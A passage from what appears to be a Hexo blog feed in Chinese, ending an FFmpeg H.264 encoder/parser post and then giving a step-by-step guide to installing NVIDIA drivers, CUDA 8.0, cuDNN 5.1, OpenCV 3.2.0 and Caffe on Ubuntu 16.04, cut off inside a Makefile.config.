class="built_in">simplest_h264_parser</span>(<span class="string">&quot;ds.h264&quot;</span>); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>原始YUV文件<code>ds_480x272.yuv</code>位于目录首页，480x272分辨率，总共100帧。H264编码程序运行时截图如下：</p>
<p><img src="/1002/h264_encoder.png"></p>
<p>将编码后的h264使用FFmpeg中的ffplay命令播放测试，运行截图如下：</p>
<p><img src="/1002/h264_ffplay.png"></p>
<h2 id="码流解析-1"><a href="#码流解析-1" class="headerlink" title="码流解析"></a>码流解析</h2><p>本程序的输入为一个H.264原始码流（裸流）的文件路径，输出为该码流的NALU统计数据，如下图所示。</p>
<p><img src="/1002/h264_parser.png"></p>
<p>至此，完成了视频的H.264编码及其码流的解析。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>FFMPEG的视音频编解码功能极其强大，几乎囊括了现存所有的视音频编码标准。如今做视音频开发的相关企业，几乎离不开它。</p>
<p>但从另一个角度来看，FFmpeg的学习难度也比较大。写作本篇课程设计所学习到的知识只是FFmpeg框架中极少的一部分，但对于认识FFmpeg有极大帮助。</p>
<p>本文使用Markdown语法编写，文中所有代码，借助的库函数及测试文件均上传至了我的Github项目页面。</p>
<p>如需查阅，请访问：<a href="https://github.com/gaoteng17/h264_encoder_parser">https://github.com/gaoteng17/h264_encoder_parser</a> 。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><em>参考资料</em></h1><ol>
<li>FFmpeg Documentation. <a href="https://ffmpeg.org/ffmpeg.html">https://ffmpeg.org/ffmpeg.html</a></li>
<li>FFmpeg - Wikipedia. <a href="https://en.wikipedia.org/wiki/FFmpeg">https://en.wikipedia.org/wiki/FFmpeg</a></li>
<li>MinGW - Wikipedia. <a href="https://en.wikipedia.org/wiki/MinGW">https://en.wikipedia.org/wiki/MinGW</a></li>
<li>H.264 - Wikipedia. <a href="https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC">https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC</a></li>
<li>FFmpeg - Github. <a href="https://github.com/FFmpeg/FFmpeg">https://github.com/FFmpeg/FFmpeg</a></li>
<li>leixiaohua - Github. <a href="https://github.com/leixiaohua1020">https://github.com/leixiaohua1020</a></li>
</ol>
]]></content>
      <tags>
        <tag>ffmpeg</tag>
        <tag>h264</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu16.04+CUDA8.0+Cudnn5.1+Opencv3.2.0+Caffe框架的搭建</title>
    <url>/1004/</url>
    <content><![CDATA[<p>Caffe全称是Convolutional Architecture for Fast Feature Embedding（卷积神经网络框架），是一个清晰、高效的深度学习框架。它是开源的，核心语言是C++，支持命令行、Python和Matlab接口，既可以在CPU上运行也可以在GPU上运行。</p>
<p>本文实现在Ubuntu16.04下深度学习框架caffe + cuda8.0 + cudnn5.1 + opencv3.2.0的搭建，并对搭建过程中的诸多问题进行总结。</p>
<span id="more"></span>



<h1 id="1-安装nvidia驱动"><a href="#1-安装nvidia驱动" class="headerlink" title="1 安装nvidia驱动"></a>1 安装nvidia驱动</h1><p><strong>首先注意：UEFI引导的电脑要在BIOS中关闭Secure boot，以避免安装驱动中各种神奇的问题。</strong></p>
<p>这里介绍两种安装n卡驱动的方式，runfile方式及apt方式。</p>
<p><strong>据说</strong>如果n卡驱动选择了apt-get方式安装，在后面的cuda模块安装时会有大坑，所以建议使用runfile方式进行安装，如果实在有问题（比如我的情况），再尝试后者。</p>
<h2 id="1-1-runfile方式"><a href="#1-1-runfile方式" class="headerlink" title="1.1 runfile方式"></a>1.1 runfile方式</h2><h3 id="禁用集成的nouveau驱动"><a href="#禁用集成的nouveau驱动" class="headerlink" title="禁用集成的nouveau驱动"></a>禁用集成的nouveau驱动</h3><p>Ubuntu系统集成的显卡驱动程序是nouveau，它是第三方为NVIDIA开发的开源驱动，我们通过将其添加至黑名单的方法对其屏蔽禁用。</p>
<p>利用命令创建<code>blacklist-nouveau.conf</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vim</span><br><span class="line">sudo vim /etc/modprobe.d/blacklist-nouveau.conf</span><br></pre></td></tr></table></figure>

<p>输入<code>i</code>切换到insert模式，添加如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure>

<p>输入<code>Esc</code>退出insert模式，再输入<code>:wq</code>保存退出。</p>
<p>更新文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-initramfs -u</span><br></pre></td></tr></table></figure>

<p>重启系统，确认nouveau已被屏蔽</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsmod | grep nouveau</span><br></pre></td></tr></table></figure>

<p>终端没有输出即已屏蔽nouveau。</p>
<h3 id="下载官方驱动程序"><a href="#下载官方驱动程序" class="headerlink" title="下载官方驱动程序"></a>下载官方驱动程序</h3><p>首先去官网上查找适合你GPU的驱动(<a href="https://www.geforce.cn/drivers)%E3%80%82">https://www.geforce.cn/drivers)。</a></p>
<p><img src="/1004/driver1.png"></p>
<p>在这个页面输入自己的显卡型号可以搜到历史版本的驱动，由于后面要装的cuda8.0适配的驱动型号是375.26,所以我们找到375.26版本的进行下载。</p>
<p><img src="/1004/driver2.png"></p>
<p>下载得到<code>NVIDIA-Linux-x86_64-375.26.run</code>文件。</p>
<p>可以将其移动到你想保存的地方，默认保存位置是<code>/home/XXXX/Downloads</code>。</p>
<h3 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h3><p>按Ctrl + Alt + F1切换到tty1，登录。接下来的安装都在这里进行。</p>
<p>关闭图形界面X-window</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service lightdm stop</span><br></pre></td></tr></table></figure>

<p>删除残留NVIDIA驱动文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove --purge nvidia-*</span><br></pre></td></tr></table></figure>

<p>切换到程序目录下并修改权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/XXXX/Downloads <span class="comment">#这里切换到你的驱动程序的目录</span></span><br><span class="line"><span class="comment">#记不清目录文件名可以用ls显示当前目录下所有文件，Tab可以补全名字</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 777 NVIDIA-Linux-x86_64-375.26.run <span class="comment">#修改可执行权限</span></span><br></pre></td></tr></table></figure>

<p>安装，<strong>注意后面的参数</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sh ./NVIDIA-Linux-x86_64-375.26.run –no-opengl-files </span><br><span class="line"><span class="comment">#只装驱动不装opengl，否则可能会无法进去桌面循环登录</span></span><br></pre></td></tr></table></figure>

<p>安装过程除了开头协议需要选择<code>accept</code>，其它按照默认选项即可。</p>
<h3 id="测试是否成功"><a href="#测试是否成功" class="headerlink" title="测试是否成功"></a>测试是否成功</h3><p>安装完成后重启系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>验证是否安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvidia-smi <span class="comment">#出现GPU驱动列表信息即成功</span></span><br></pre></td></tr></table></figure>

<p>也可以查看图形界面信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvidia-settings </span><br></pre></td></tr></table></figure>

<p>UEFI引导系统如果没关secure boot这里可能无法正常显示（但我在Ubuntu17.04下测试显示是正常的），而且会导致后面cuda安装出问题，这里注意一下。</p>
<h2 id="1-2-apt-get方式"><a href="#1-2-apt-get方式" class="headerlink" title="1.2 apt-get方式"></a>1.2 apt-get方式</h2><p>这个方式似乎只能安装到最新的驱动，我这里即使选择了旧版的也安装上了最新的。</p>
<p>禁用集成的nouveau驱动（同上）</p>
<p>添加三方ppa源，更新</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:graphics-drivers/ppa</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>新安装的ubuntu16.04在进行 <code>sudo apt-get update</code> 时可能会出现下面的错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Reading package lists... Done</span><br><span class="line">E: Problem executing scripts APT::Update::Post-Invoke-Success</span><br><span class="line"><span class="string">&#x27;if /usr/bin/test -w /var/cache/app-info -a -e /usr/bin/appstreamcli;</span></span><br><span class="line"><span class="string"> then appstreamcli refresh &gt; /dev/null;</span></span><br><span class="line"><span class="string"> fi&#x27;</span></span><br><span class="line">E: Sub-process returned an error code</span><br></pre></td></tr></table></figure>

<p>解决方案：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pkill -KILL appstreamcli</span><br><span class="line">wget -P /tmp https://launchpad.net/ubuntu/+archive/primary/+files/appstream_0.9.4-1ubuntu1_amd64.deb https://launchpad.net/ubuntu/+archive/primary/+files/libappstream3_0.9.4-1ubuntu1_amd64.deb</span><br><span class="line">sudo dpkg -i /tmp/appstream_0.9.4-1ubuntu1_amd64.deb /tmp/libappstream3_0.9.4-1ubuntu1_amd64.deb</span><br></pre></td></tr></table></figure>



<p>查找驱动版本并安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-cache search nvidia-* <span class="comment">#可以看到各个驱动版本</span></span><br><span class="line">sudo apt-get install nvidia-375 <span class="comment">#选择安装375版本，但我这里最后还是装上了最新的</span></span><br></pre></td></tr></table></figure>

<p>测试是否成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvidia-smi <span class="comment">#出现GPU驱动列表信息即成功</span></span><br></pre></td></tr></table></figure>

<p>也可以查看图形界面信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvidia-settings </span><br></pre></td></tr></table></figure>

<p><img src="/1004/driver3.png"></p>
<p>总结：使用较新的n卡驱动是可以安装cuda的，但是在测试cuda的samples时会发现，许多sample会由于nvidia显卡驱动版本的问题出现各种错误，这种情况需要自己改写这些文件的相关源码，这无疑是个艰难的工程。所以，应尽量保证驱动的版本与cuda相一致。</p>
<h1 id="2-安装CUDA"><a href="#2-安装CUDA" class="headerlink" title="2 安装CUDA"></a>2 安装CUDA</h1><p>cuda是nvidia的编程语言平台，想使用GPU就必须要使用cuda。</p>
<p>虽然cuda9.X已经发布，但很多类库还不支持，而且最关键的是caffe要求的cuda版本是8.0，所以这里安装的是cuda8.0。</p>
<p>到官网下载cuda8.0（<a href="https://developer.nvidia.com/cuda-80-ga2-download-archive">https://developer.nvidia.com/cuda-80-ga2-download-archive</a> ）。</p>
<p>按照自己的平台选择<code>runfile(local)</code>格式。</p>
<p><img src="/1004/cuda1.png"></p>
<p>下载得到<code>cuda_8.0.61_375.26_linux.run</code>。</p>
<p>终端切换到该目录下，执行如下语句安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 777 cuda_8.0.61_375.26_linux.run <span class="comment">#修改执行权限</span></span><br><span class="line">sudo sh ./cuda_8.0.61_375.26_linux.run</span><br></pre></td></tr></table></figure>

<p>执行后会有一系列提示让你确认，注意，有个让你选择是否安装nvidia375驱动时，一定要选择否，因为这个驱动是会安装opengl的，有可能会导致无法进入桌面循环登录。</p>
<p><strong>据说</strong>这里也可以用<code>-no-opengl-files</code>命令避免该问题，但我不知道这命令该用到哪，所以并没有尝试。</p>
<p>其余的选项都直接默认或者选择是即可（我这里只把samples的目录改成了cuda的默认安装位置，不建议修改cuda默认安装位置，以免给自己挖坑）。</p>
<p>安装成功后终端会输出如下信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">===========</span><br><span class="line">= Summary =</span><br><span class="line">===========</span><br><span class="line">Driver: Not Selected</span><br><span class="line">Toolkit: Installed <span class="keyword">in</span> /usr/local/cuda-8.0 <span class="comment">#cuda安装目录</span></span><br><span class="line">Samples: Installed <span class="keyword">in</span> /usr/local/cuda-8.0 <span class="comment">#sample目录，我改到了cuda安装目录</span></span><br><span class="line">Please make sure that</span><br><span class="line">– PATH includes /usr/local/cuda-8.0/bin</span><br><span class="line">– LD_LIBRARY_PATH includes /usr/local/cuda-8.0/lib64, or, add /usr/local/cuda-8.0/lib64 to /etc/ld.so.conf and run ldconfig as root</span><br><span class="line">To uninstall the CUDA Toolkit, run the uninstall script <span class="keyword">in</span> /usr/local/cuda-8.0/bin</span><br><span class="line">Please see CUDA_Installation_Guide_Linux.pdf <span class="keyword">in</span> /usr/local/cuda-8.0/doc/pdf <span class="keyword">for</span> detailed information on setting up CUDA.</span><br><span class="line">***WARNING: Incomplete installation! This installation did not install the CUDA Driver. A driver of version at least 361.00 is required <span class="keyword">for</span> CUDA 8.0 functionality to work.</span><br><span class="line">To install the driver using this installer, run the following <span class="built_in">command</span>, replacing with the name of this run file:</span><br><span class="line">sudo .run -silent -driver</span><br><span class="line">Logfile is /opt/temp//cuda_install_****.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>安装完毕后，再声明一下环境变量，并将其写入到 ~&#x2F;.bashrc 的尾部:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim  ~/.bashrc <span class="comment">#编辑</span></span><br><span class="line"><span class="comment">#以下两行写到~/.bashrc尾部</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/local/cuda-8.0/bin<span class="variable">$&#123;PATH:+:<span class="variable">$&#123;PATH&#125;</span>&#125;</span></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=/usr/local/cuda-8.0/lib64<span class="variable">$&#123;LD_LIBRARY_PATH:+:<span class="variable">$&#123;LD_LIBRARY_PATH&#125;</span>&#125;</span></span><br><span class="line"><span class="comment">#保存退出 :wq</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc <span class="comment">#更新</span></span><br></pre></td></tr></table></figure>

<p>然后设置环境变量和动态链接库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"><span class="built_in">export</span> PATH=/usr/local/cuda/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#保存退出 :wq</span></span><br><span class="line">sudo vim /etc/ld.so.conf.d/cuda.conf</span><br><span class="line">/usr/local/cuda/lib64 </span><br><span class="line"><span class="comment">#保存退出 :wq</span></span><br><span class="line">sudo ldconfig <span class="comment">#更新</span></span><br></pre></td></tr></table></figure>

<p>测试cuda的samples</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/cuda-8.0/samples/1_Utilities/deviceQuery <span class="comment">#注意自己的samples目录装在了哪</span></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到终端提示的生成目录</span></span><br><span class="line"></span><br><span class="line">sudo ./deviceQuery</span><br></pre></td></tr></table></figure>

<p>如果显示的是如下图的一些关于GPU的信息，则说明安装成功了。</p>
<p><img src="/1004/cuda2.png"></p>
<h1 id="3-使用cudnn"><a href="#3-使用cudnn" class="headerlink" title="3 使用cudnn"></a>3 使用cudnn</h1><p>cuDNN（CUDA Deep Neural Network）相比标准的cuda，它在一些常用的神经网络操作上进行了性能的优化，比如卷积，pooling，归一化，以及激活层等等。 </p>
<p>cudnn目前（2018.1）已更新到了v7.0.5，针对cuda8.0有v5.1和v6.0两个版本可选，这里选择v5.1版本下载。</p>
<p>首先去官网（<a href="https://developer.nvidia.com/rdp/cudnn-download">https://developer.nvidia.com/rdp/cudnn-download</a> ）下载cudnn，下载的时候需要注册账号，做一个问卷调查。</p>
<p><img src="/1004/cudnn1.png"></p>
<p>下载完cudnn5.1之后进行解压，cd进入该目录，复制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> cuda/ <span class="comment">#进入该解压目录</span></span><br><span class="line">sudo <span class="built_in">cp</span> include/cudnn.h /usr/local/cuda/include/    <span class="comment">#复制头文件</span></span><br><span class="line">sudo <span class="built_in">cp</span> lib64/lib* /usr/local/cuda/lib64/    <span class="comment">#复制动态链接库</span></span><br></pre></td></tr></table></figure>

<p>重新生成软链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/cuda/lib64/</span><br></pre></td></tr></table></figure>

<p>这里可以先<code>ls</code>看一下自己的<code>libcudnn.so.*.*.*</code>具体版本号</p>
<p><img src="/1004/cudnn2.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> -rf libcudnn.so libcudnn.so.5    <span class="comment">#删除原有动态文件</span></span><br><span class="line">sudo <span class="built_in">ln</span> -s libcudnn.so.5.1.10 libcudnn.so.5  <span class="comment">#生成软链接，注意版本号一致</span></span><br><span class="line">sudo <span class="built_in">ln</span> -s libcudnn.so.5 libcudnn.so      <span class="comment">#生成软链接</span></span><br></pre></td></tr></table></figure>



<h1 id="4-安装opencv"><a href="#4-安装opencv" class="headerlink" title="4 安装opencv"></a>4 安装opencv</h1><p>OpenCV是一个基于BSD许可（开源）发行的跨平台计算机视觉库。</p>
<p>在深度学习框架中提供图像处理等功能，目前已更新到了3.4.0版本，caffe对opencv版本无要求，这里选择了3.2.0版本安装。</p>
<p>首先去官网（<a href="https://opencv.org/releases.html">https://opencv.org/releases.html</a> ）下载opencv，选择<code>Sources</code>即可。</p>
<p><img src="/1004/opencv1.png"></p>
<p>首先安装Ubuntu系统需要的依赖项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install --assume-yes libopencv-dev build-essential cmake git libgtk2.0-dev pkg-config python-dev python-numpy libdc1394-22 libdc1394-22-dev libjpeg-dev libpng12-dev libtiff5-dev libjasper-dev libavcodec-dev libavformat-dev libswscale-dev libxine2-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev libv4l-dev libtbb-dev libqt4-dev libfaac-dev libmp3lame-dev libopencore-amrnb-dev libopencore-amrwb-dev libtheora-dev libvorbis-dev libxvidcore-dev x264 v4l-utils unzip</span><br></pre></td></tr></table></figure>

<p>这里注意一下，如果中途有问题中断，终端有提示<code>update</code>的话，则输入<code>sudo apt-get update</code>，之后再重复执行即可。反复几次，直到出现下图提示信息即安装完毕。</p>
<p><img src="/1004/opencv2.png"></p>
<p>然后安装opencv需要的一些依赖项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential cmake git</span><br><span class="line">sudo apt-get install ffmpeg libopencv-dev libgtk-3-dev python-numpy python3-numpy libdc1394-22 libdc1394-22-dev libjpeg-dev libpng12-dev libtiff5-dev libjasper-dev libavcodec-dev libavformat-dev libswscale-dev libxine2-dev libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev libv4l-dev libtbb-dev qtbase5-dev libfaac-dev libmp3lame-dev libopencore-amrnb-dev libopencore-amrwb-dev libtheora-dev libvorbis-dev libxvidcore-dev x264 v4l-utils unzip</span><br></pre></td></tr></table></figure>

<p>这里同样可能会有和上面相同的问题，方法同上面一致。</p>
<p>解压之前下载好的opencv到你喜欢的位置，<code>cd</code>到该文件夹下，然后：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> build   <span class="comment">#新建一个build文件夹，编译的工程都在这个文件夹里</span></span><br><span class="line"><span class="built_in">cd</span> build/    </span><br><span class="line">cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local -D WITH_TBB=ON -D WITH_V4L=ON -D WITH_QT=ON -D WITH_OPENGL=ON -DCUDA_NVCC_FLAGS=<span class="string">&quot;-D_FORCE_INLINES&quot;</span> ..</span><br></pre></td></tr></table></figure>

<p>cmake成功后，会出现如下结果，提示配置和生成成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- Configuring <span class="keyword">done</span></span><br><span class="line">-- Generating <span class="keyword">done</span></span><br><span class="line">-- Build files have been written to: /XXXX/opencv-3.2.0/build</span><br></pre></td></tr></table></figure>

<p>然后使用make命令编译即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j4 <span class="comment">#-j后数字设置为cpu核数时可以加快编译速度</span></span><br></pre></td></tr></table></figure>

<p>这里注意一下，在编译opencv时，ffmpeg或ippicv等第三方库可能会由于众所周知的原因下载不成功，一般解决方法是自己到github上下载，之后解压到相关路径。</p>
<p>但这种方式比较麻烦，容易出错，不推荐。</p>
<p>这里推荐挂梯子来下载。访问蓝灯github页面（<a href="https://github.com/getlantern/lantern">https://github.com/getlantern/lantern</a> ），下载ubuntu平台的安装包。</p>
<p><img src="/1004/lantern.png"></p>
<p>之后使用命令安装即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i lantern-installer-64-bit.deb</span><br></pre></td></tr></table></figure>

<p>使用时在终端输入<code>lantern</code>，不用的时候<code>Ctrl + C</code>即可。</p>
<p>另外一个可能出现的问题：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fatal error: LAPACKE_H_PATH-NOTFOUND/lapacke.h: No such file or directory <span class="comment">#include &quot;LAPACKE_H_PATH-NOTFOUND/lapacke.h&quot;</span></span><br><span class="line"></span><br><span class="line">LAPACK and BLAS are installed.. Any ideas? Didn<span class="string">&#x27;t get these errors with 3.1 or previous 2.4.X versions...</span></span><br></pre></td></tr></table></figure>

<p>解决方案：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install liblapacke-dev checkinstall</span><br></pre></td></tr></table></figure>



<p>opencv编译成功后进行安装，并有将设置写入到系统中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br><span class="line">sudo /bin/bash -c <span class="string">&#x27;echo &quot;/usr/local/lib&quot; &gt; /etc/ld.so.conf.d/opencv.conf&#x27;</span></span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>



<h1 id="5-安装caffe"><a href="#5-安装caffe" class="headerlink" title="5 安装caffe"></a>5 安装caffe</h1><p>Caffe （卷积神经网络框架）是一种应用广泛的深度学习框架，caffe团队在17年初推出了caffe2框架，号称对mobile端有更好的支持，但是目前还是处于初级阶段，这里选择caffe安装配置。</p>
<p>caffe官方网站（<a href="http://caffe.berkeleyvision.org/">http://caffe.berkeleyvision.org/</a> ）中也给出了全部安装依赖项。</p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update </span><br><span class="line">sudo apt-get install -y build-essential cmake git pkg-config </span><br><span class="line">sudo apt-get install -y libprotobuf-dev libleveldb-dev libsnappy-dev libhdf5-serial-dev protobuf-compiler </span><br><span class="line">sudo apt-get install -y libatlas-base-dev </span><br><span class="line">sudo apt-get install -y libopenblas-dev </span><br><span class="line">sudo apt-get install -y --no-install-recommends libboost-all-dev </span><br><span class="line">sudo apt-get install -y libgflags-dev libgoogle-glog-dev liblmdb-dev </span><br><span class="line">sudo apt-get install -y python-pip </span><br><span class="line">sudo apt-get install -y python-dev </span><br><span class="line">sudo apt-get install -y python-numpy python-scipy </span><br><span class="line">sudo apt-get install libhdf5-dev </span><br></pre></td></tr></table></figure>

<p>将终端<code>cd</code>到你要安装caffe的位置，执行如下指令，clone caffe项目。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/BVLC/caffe.git  <span class="comment">#从github上git caffe</span></span><br><span class="line"><span class="built_in">cd</span> caffe <span class="comment">#打开到刚刚git下来的caffe </span></span><br></pre></td></tr></table></figure>

<p>安装caffe项目中python相关的依赖库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> python/requirements.txt | xargs -L 1 sudo pip install  </span><br></pre></td></tr></table></figure>

<p>增加符号链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /usr/include/python2.7/ /usr/local/include/python2.7   </span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/lib/python2.7/dist-packages/numpy/core/include/numpy/ /usr/local/include/python2.7/numpy  </span><br></pre></td></tr></table></figure>

<p>修改配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> Makefile.config.example Makefile.config</span><br><span class="line"><span class="comment">#Makefile.config.example是caffe给出的makefile例子，复制到Makefile.config</span></span><br><span class="line">sudo gedit Makefile.config <span class="comment">#编辑Makefile.config文件 </span></span><br></pre></td></tr></table></figure>

<h2 id="编辑Makefile-config文件"><a href="#编辑Makefile-config文件" class="headerlink" title="编辑Makefile.config文件"></a>编辑Makefile.config文件</h2><p>这里给出我的加了注释的Makefile.config文件供参考：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Refer to http://caffe.berkeleyvision.org/installation.html</span></span><br><span class="line"><span class="comment"># Contributions simplifying and improving our build system are welcome!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cuDNN acceleration switch (uncomment to build with cuDNN).</span></span><br><span class="line"> USE_CUDNN := 1</span><br><span class="line"><span class="string">&#x27;在有nvidia GPU并且安装CuDNN的情况下取消注释&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CPU-only switch (uncomment to build without GPU support).</span></span><br><span class="line"><span class="comment"># CPU_ONLY := 1</span></span><br><span class="line"><span class="string">&#x27;如果取消注释则只使用cpu&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment to disable IO dependencies and corresponding data layers</span></span><br><span class="line"> USE_OPENCV := 1</span><br><span class="line"> <span class="string">&#x27;因为要用到OpenCV库所以要打开，下面这两个选项表示是选择Caffe的数据管理第三方库，两者都不打开Caffe默认用的是LMDB，这两者均是嵌入式数据库管理系统编程库&#x27;</span></span><br><span class="line"><span class="comment"># USE_LEVELDB := 0</span></span><br><span class="line"><span class="comment"># USE_LMDB := 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment to allow MDB_NOLOCK when reading LMDB files (only if necessary)</span></span><br><span class="line"><span class="comment">#	You should not set this flag if you will be reading LMDBs with any</span></span><br><span class="line"><span class="comment">#	possibility of simultaneous read and write</span></span><br><span class="line"><span class="comment"># ALLOW_LMDB_NOLOCK := 1</span></span><br><span class="line"><span class="string">&#x27;当需要读取LMDB文件时可以取消注释，默认不打开&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment if you&#x27;re using OpenCV 3</span></span><br><span class="line"> OPENCV_VERSION := 3</span><br><span class="line"><span class="string">&#x27;安装的opencv版本，2.X版本的话是2,3.X版本就是3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To customize your choice of compiler, uncomment and set the following.</span></span><br><span class="line"><span class="comment"># N.B. the default for Linux is g++ and the default for OSX is clang++</span></span><br><span class="line"><span class="comment"># CUSTOM_CXX := g++</span></span><br><span class="line"><span class="string">&#x27;linux系统默认使用g++编译器，OSX则是clang++&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CUDA directory contains bin/ and lib/ directories that we need.</span></span><br><span class="line">CUDA_DIR := /usr/local/cuda</span><br><span class="line"><span class="string">&#x27;cuda安装目录，如果前面给自己挖坑了这里改一下&#x27;</span></span><br><span class="line"><span class="comment"># On Ubuntu 14.04, if cuda tools are installed via</span></span><br><span class="line"><span class="comment"># &quot;sudo apt-get install nvidia-cuda-toolkit&quot; then use this instead:</span></span><br><span class="line"><span class="comment"># CUDA_DIR := /usr</span></span><br><span class="line"><span class="string">&#x27;如果是在ubuntu14.04版本下通过apt-get方式安装的cuda则在上面这个目录&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CUDA architecture setting: going with all of them.</span></span><br><span class="line"><span class="comment"># For CUDA &lt; 6.0, comment the *_50 through *_61 lines for compatibility.</span></span><br><span class="line"><span class="comment"># For CUDA &lt; 8.0, comment the *_60 and *_61 lines for compatibility.</span></span><br><span class="line"><span class="comment"># For CUDA &gt;= 9.0, comment the *_20 and *_21 lines for compatibility.</span></span><br><span class="line">CUDA_ARCH := -gencode <span class="built_in">arch</span>=compute_20,code=sm_20 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_20,code=sm_21 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_30,code=sm_30 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_35,code=sm_35 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_50,code=sm_50 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_52,code=sm_52 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_60,code=sm_60 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_61,code=sm_61 \</span><br><span class="line">		-gencode <span class="built_in">arch</span>=compute_61,code=compute_61</span><br><span class="line"><span class="string">&#x27;这些参数需要根据GPU的计算能力来设置，不做调整（主要是不会。。）。&#x27;</span></span><br><span class="line"><span class="string">&#x27;这个网站可以查询自己GPU的算力&#x27;</span></span><br><span class="line"><span class="string">&#x27;http://blog.csdn.net/jiajunlee/article/details/52067962&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># BLAS choice:</span></span><br><span class="line"><span class="comment"># atlas for ATLAS (default)</span></span><br><span class="line"><span class="comment"># mkl for 